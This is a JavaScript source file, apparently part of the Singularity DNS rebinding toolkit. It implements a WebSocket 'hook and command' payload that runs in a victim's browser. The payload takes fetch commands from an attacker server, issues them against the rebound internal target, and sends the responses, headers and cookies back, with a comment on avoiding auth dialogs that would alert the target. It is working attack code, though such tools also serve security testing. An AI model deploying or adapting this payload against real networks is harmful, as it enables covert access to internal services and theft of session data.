function webSocketHook(headers, initialCookie, wsProxyPort, retry) {
    if (retry < 0) {
        console.log(`Abandoning websocket connection to Singularity after too many retries for: ${window.location.host}`);
        return;
    }

    const serverIp = document.location.hostname.split('-')[1]
    const wsurl = `${serverIp}:${wsProxyPort}`
    let httpAuth = false;

    // Did successful rebinding request required HTTP Auth?
    if (headers.get('www-authenticate') !== null) {
        httpAuth = true;
    };

    let ws = new WebSocket(`ws://${wsurl}/soows`);

    ws.onmessage = function (m) {
        const data = JSON.parse(m.data);

        // if our first rebinding request required HTTP Auth, 
        // choose to not pass cookies between target and victim from now on,
        // as fetch() credential = 'include' will trigger a dialog box 
        // if HTTP auth is required in target's browser
        // therefore informing target of ongoing attack.
        // Could be a problem if CSRF tokens are passed in cookies... 
        if (httpAuth === true) {
            data.payload.fetchrequest.credentials = 'omit';
        }

        if (data.command === 'fetch') {
            if (data.payload.fetchrequest.method === 'GET' || data.payload.fetchrequest.message === 'HEAD') {
                delete data.payload.fetchrequest.body;
            } else {
                if (data.payload.fetchrequest.body !== null) {
                    data.payload.fetchrequest.body = atobUTF8(data.payload.fetchrequest.body)
                }
            }
            const messageID = data.payload.fetchrequest.id
            let fetchResponse = {
                "id": messageID,
                "command": "fetchResponse",
                "response": {},
                "body": "",
            }

            const fetch_retry = (url, options, n) => sooFetch(url, options)
                .then(function (r) {
                    fetchResponse.response.headers = r.headers;
                    fetchResponse.response.ok = r.ok;
                    fetchResponse.response.redirected = r.redirected;
                    fetchResponse.response.status = r.status;
                    fetchResponse.response.type = r.type;
                    fetchResponse.response.url = r.url;
                    fetchResponse.response.body = r.body;
                    fetchResponse.response.bodyUsed = r.bodyUsed;
                    fetchResponse.response.headers = {};
                    for (let pair of r.headers.entries()) {
                        fetchResponse.response.headers[pair[0]] = pair[1];
                    };
                    fetchResponse.response.cookies = getCookies();
                    return r.arrayBuffer()
                })
                .then(function (result) {
                    fetchResponse.body = base64ArrayBuffer(result);
                    ws.send(JSON.stringify(fetchResponse));
                }).catch(function (e) {
                    console.log(`Hook and command payload's fetch failed for frame ${window.location}: ${e}`);
                    if (n === 1) throw "Hook and command payload's fetch failed";
                    wait(1000).then(() => { return fetch_retry(url, options, n - 1); })
                });;

            fetch_retry(data.payload.url, data.payload.fetchrequest, 10);

        }

    }
    ws.onopen = function (evt) { }
    ws.onerror = function (e) {
        console.log(`WS error: ${e}`);
    }

    wait(1000)
        .then(() => {
            if (ws.readyState !== 1) {
                webSocketHook(initialCookie, wsProxyPort, retry - 1);
            } else {
                console.log(`Successfully connected to Singularity via websockets for: ${window.location.host}`);
            }
        })
}